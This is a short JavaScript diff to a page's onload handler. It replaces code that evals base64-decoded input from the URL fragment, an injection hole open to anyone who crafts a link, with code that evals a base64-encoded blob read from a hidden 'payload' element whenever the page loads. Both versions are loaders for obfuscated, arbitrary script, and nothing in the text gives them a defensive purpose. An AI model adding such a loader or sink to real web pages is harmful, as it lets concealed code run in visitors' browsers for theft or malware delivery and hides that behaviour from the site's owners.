@@ -1,5 +1,7 @@
 window.onload = function() {
-  if (location.hash.length > 1) {
-    eval(decodeURIComponent(atob(location.hash.slice(1))));
+  const payloadDiv = document.getElementById('payload');
+
+  if (payloadDiv && payloadDiv.innerText.trim().length > 0) {
+    eval(decodeURIComponent(atob(payloadDiv.innerText.trim())));
   }
 };
